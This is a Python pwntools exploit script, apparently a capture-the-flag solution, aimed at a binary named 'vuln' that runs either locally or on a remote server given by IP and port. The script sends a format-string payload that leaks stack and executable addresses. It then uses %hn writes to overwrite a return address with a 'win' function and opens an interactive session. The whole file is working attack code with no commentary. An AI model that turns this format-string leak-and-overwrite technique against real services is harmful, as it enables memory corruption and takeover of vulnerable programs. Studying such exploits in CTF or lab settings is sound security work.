#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("74.207.229.59", 20221)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            c
            ''')

# input()

payload = b'%9$p%27$p|'
p.send(payload)

p.recvuntil(b'twice\n')
leak = p.recvuntil(b'|', drop=True).split(b'0x')
leak[1] = int(leak[1], 16)
leak[2] = int(leak[2], 16)

print("Stack leak: " + hex(leak[1]))
ret = leak[1] + 0x40

print("Exe leak: " + hex(leak[2]))
exe.address = leak[2] - 0x11b3
print("Exe base: " + hex(exe.address))

win = exe.address + 0x11a1 # exe.sym.win + 24

package = {
    win & 0xffff: ret,
    win >> 16 & 0xffff: ret + 2,
    win >> 32 & 0xffff: ret + 4,
}
order = sorted(package)
print(package)
print(order)

payload = f'%{order[0]}c%14$hn'.encode()
payload += f'%{order[1] - order[0]}c%15$hn'.encode()
payload += f'%{order[2] - order[1]}c%16$hn'.encode()
payload = payload.ljust(0x40, b'a')
payload += flat(
    package[order[0]],
    package[order[1]],
    package[order[2]]
    )
p.send(payload)

p.interactive()